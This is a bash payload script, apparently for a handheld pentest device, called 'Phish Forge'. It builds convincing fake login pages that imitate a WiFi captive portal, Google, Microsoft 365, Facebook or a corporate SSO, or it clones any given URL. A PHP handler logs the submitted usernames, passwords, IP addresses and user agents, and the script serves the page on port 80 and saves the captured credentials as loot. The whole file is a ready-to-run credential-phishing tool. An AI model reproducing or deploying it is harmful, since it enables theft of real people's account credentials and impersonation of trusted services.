#!/bin/bash
# Title: Phish Forge
# Author: bad-antics
# Description: Automated phishing portal generator with credential capture
# Category: nullsec/social

LOOT_DIR="/mmc/nullsec/phish-forge"
PORTAL_DIR="/tmp/phish-portal"
mkdir -p "$LOOT_DIR" "$PORTAL_DIR"

PROMPT "PHISH FORGE

Auto-generates convincing
captive portal login pages
that capture credentials.

Templates:
- WiFi login page
- Corporate SSO
- Social media
- Banking portal
- Custom clone

Press OK to configure."

PROMPT "SELECT TEMPLATE

1. WiFi Captive Portal
2. Google Sign-In
3. Microsoft 365
4. Facebook Login
5. Corporate SSO
6. Clone URL (wget)

Select on next screen."

TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEMPLATE=1 ;; esac

CAPTURE_SCRIPT='<?php
$log = fopen("/tmp/phish-creds.txt", "a");
$ts = date("Y-m-d H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"];
$user = isset($_POST["username"]) ? $_POST["username"] : (isset($_POST["email"]) ? $_POST["email"] : "N/A");
$pass = isset($_POST["password"]) ? $_POST["password"] : "N/A";
fwrite($log, "$ts | $ip | $user | $pass | $ua\n");
fclose($log);
header("Location: https://www.google.com");
exit;
?>'

echo "$CAPTURE_SCRIPT" > "$PORTAL_DIR/capture.php"

case $TEMPLATE in
    1)
        cat > "$PORTAL_DIR/index.html" << 'WIFIHTML'
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi - Connect</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f5f5f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:40px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:400px;width:90%}
h2{margin:0 0 8px;color:#333}p{color:#666;margin:0 0 24px;font-size:14px}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:16px}
button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
button:hover{background:#0056b3}.logo{text-align:center;margin-bottom:24px;font-size:32px}
</style></head><body>
<div class="card"><div class="logo">📶</div>
<h2>Connect to WiFi</h2><p>Sign in to access the internet</p>
<form method="POST" action="capture.php">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form><p style="text-align:center;margin-top:16px;font-size:12px;color:#999">By connecting you agree to our Terms of Service</p>
</div></body></html>
WIFIHTML
        ;;
    2)
        cat > "$PORTAL_DIR/index.html" << 'GHTML'
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
body{font-family:'Google Sans',Roboto,sans-serif;background:#f8f9fa;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;padding:48px 40px;box-shadow:0 1px 3px rgba(0,0,0,.12);max-width:400px;width:90%;border:1px solid #dadce0}
h1{font-size:24px;font-weight:400;margin:16px 0 8px;color:#202124}p{color:#5f6368;font-size:16px;margin:0 0 32px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:24px;outline:none}
input:focus{border-color:#1a73e8;border-width:2px}
button{padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;float:right;font-weight:500;letter-spacing:.25px}
.forgot{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}
.logo{font-size:24px;text-align:center}
.logo span{color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
</style></head><body>
<div class="card">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Sign in</h1><p>Use your Google Account</p>
<form method="POST" action="capture.php">
<input type="email" name="username" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<a href="#" class="forgot">Forgot password?</a>
<button type="submit">Next</button>
</form></div></body></html>
GHTML
        ;;
    3)
        cat > "$PORTAL_DIR/index.html" << 'MSHTML'
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:44px;max-width:440px;width:90%;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.ms-logo{font-size:20px;margin-bottom:16px}
.ms-logo span{display:inline-block;width:10px;height:10px;margin-right:2px}
.ms-logo span:nth-child(1){background:#f25022}.ms-logo span:nth-child(2){background:#7fba00}
.ms-logo span:nth-child(3){background:#00a4ef}.ms-logo span:nth-child(4){background:#ffb900}
h2{font-size:24px;font-weight:600;margin:16px 0 4px;color:#1b1b1b}
p{color:#1b1b1b;font-size:13px;margin:0 0 25px}
input{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;margin-bottom:16px;outline:none;background:transparent}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;font-weight:600;margin-top:16px}
</style></head><body>
<div class="card">
<div class="ms-logo"><span></span><span></span><br><span></span><span></span> Microsoft</div>
<h2>Sign in</h2><p>to continue to Microsoft 365</p>
<form method="POST" action="capture.php">
<input type="email" name="username" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
MSHTML
        ;;
    4)
        cat > "$PORTAL_DIR/index.html" << 'FBHTML'
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook - Log In or Sign Up</title>
<style>
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1);max-width:396px;width:90%}
.logo{color:#1877f2;font-size:40px;font-weight:700;text-align:center;margin-bottom:16px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;box-sizing:border-box;margin-bottom:12px}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.divider{border-top:1px solid #dadde1;margin:20px 0}
.forgot{text-align:center;display:block;color:#1877f2;font-size:14px;text-decoration:none}
</style></head><body>
<div class="card"><div class="logo">facebook</div>
<form method="POST" action="capture.php">
<input type="text" name="username" placeholder="Email address or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<a href="#" class="forgot">Forgotten password?</a>
<div class="divider"></div>
</div></body></html>
FBHTML
        ;;
    5)
        CORP_NAME=$(TEXT_PICKER "Company name:" "Acme Corp")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CORP_NAME="Acme Corp" ;; esac
        cat > "$PORTAL_DIR/index.html" << CORPHTML
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${CORP_NAME} - SSO Login</title>
<style>
body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:16px;padding:48px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:400px;width:90%}
h1{margin:0 0 8px;color:#333;font-size:24px}p{color:#666;margin:0 0 32px}
input{width:100%;padding:14px;border:1px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:16px}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:600}
.corp-logo{font-size:28px;font-weight:700;color:#667eea;margin-bottom:32px}
</style></head><body>
<div class="card"><div class="corp-logo">${CORP_NAME}</div>
<h1>Single Sign-On</h1><p>Enter your corporate credentials</p>
<form method="POST" action="capture.php">
<input type="text" name="username" placeholder="Username or employee ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>
CORPHTML
        ;;
    6)
        CLONE_URL=$(TEXT_PICKER "URL to clone:" "https://example.com/login")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
        SPINNER_START "Cloning page..."
        wget -q -p -k -E -O "$PORTAL_DIR/index.html" "$CLONE_URL" 2>/dev/null
        # Inject capture form action
        sed -i 's|action="[^"]*"|action="capture.php"|g' "$PORTAL_DIR/index.html" 2>/dev/null
        sed -i "s|method='[^']*'|method='POST'|g" "$PORTAL_DIR/index.html" 2>/dev/null
        SPINNER_STOP
        ;;
esac

# Deploy portal
resp=$(CONFIRMATION_DIALOG "DEPLOY PORTAL?

Template ready.
Will start web server
on port 80.

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "PhishForge: template=$TEMPLATE deployed"
SPINNER_START "Portal active..."

# Start PHP server
cd "$PORTAL_DIR"
php -S 0.0.0.0:80 &>/dev/null &
PHP_PID=$!

# Monitor for captures
CRED_COUNT=0
while true; do
    sleep 10
    NEW_COUNT=$(wc -l < /tmp/phish-creds.txt 2>/dev/null || echo 0)
    if [ "$NEW_COUNT" -gt "$CRED_COUNT" ]; then
        CRED_COUNT=$NEW_COUNT
        LAST=$(tail -1 /tmp/phish-creds.txt)
        NOTIFICATION "Captured: $LAST"
    fi
    # Check if we should stop (file signal)
    [ -f /tmp/phish-stop ] && break
done &
MONITOR_PID=$!

PROMPT "PORTAL RUNNING

Listening on port 80
Template: $TEMPLATE

Credentials captured: $(wc -l < /tmp/phish-creds.txt 2>/dev/null || echo 0)

Press OK to stop portal."

kill $PHP_PID $MONITOR_PID 2>/dev/null
SPINNER_STOP

# Save results
CRED_COUNT=$(wc -l < /tmp/phish-creds.txt 2>/dev/null || echo 0)
[ -f /tmp/phish-creds.txt ] && cp /tmp/phish-creds.txt "$LOOT_DIR/creds_$(date +%Y%m%d_%H%M%S).txt"

PROMPT "PORTAL STOPPED

Credentials captured: $CRED_COUNT

Saved to phish-forge/

Press OK to exit."

rm -rf "$PORTAL_DIR" /tmp/phish-creds.txt /tmp/phish-stop
